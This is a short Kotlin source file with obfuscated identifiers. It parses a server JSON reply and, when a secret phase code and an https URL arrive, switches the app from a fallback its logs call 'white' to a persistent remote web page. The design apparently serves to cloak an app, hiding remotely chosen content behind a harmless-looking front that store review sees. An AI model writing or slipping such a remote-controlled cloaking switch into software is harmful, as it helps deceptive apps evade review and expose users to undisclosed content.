package com.p95ea315e.complete_first_called_neon.pin

import com.p95ea315e.complete_first_called_neon.cask.SootChalk
import org.json.JSONObject

object GustParse {
    const val STATE = "brim"
    const val HREF = "quay"
    const val STICKY = "moor"
    const val TTL = "span"
    const val PASS = "p81"
    const val OFF = "n9a"

    fun parseGust(raw: String, latch: RiftClip): RiftLane {
        if (raw.isBlank()) {
            SootChalk.i("pick blank body → white unless clip")
            return latch.peekClip()?.toLane() ?: RiftLane.PaleSlab
        }
        val json = runCatching { JSONObject(raw) }.getOrNull()
        if (json == null) {
            SootChalk.i("pick not JSON")
            return latch.peekClip()?.toLane() ?: RiftLane.PaleSlab
        }
        val state = json.optString(STATE)
        val href = json.optString(HREF).trim()
        val keep = json.optString(STICKY)
        val untilRaw = json.optString(TTL)
        SootChalk.i("pick phase=$state target=$href keep=$keep until=$untilRaw")
        if (state != PASS || !isHttpsHref(href)) {
            SootChalk.i("pick white need phase=$PASS + https")
            latch.dropClip()
            return RiftLane.PaleSlab
        }
        val expires = untilRaw.toLongOrNull() ?: 0L
        val sticky = keep == PASS
        if (sticky) {
            latch.pinClip(href, expires)
        } else {
            latch.dropClip()
        }
        return RiftLane.OfferGlaze(
            href = href,
            restoreHistory = latch.sameClip(href),
            persistOnPause = sticky,
        )
    }

    fun isHttpsHref(href: String): Boolean = href.startsWith("https://")

    private fun RiftClip.RiftPin.toLane() = RiftLane.OfferGlaze(
        href = href,
        restoreHistory = true,
        persistOnPause = true,
    )
}
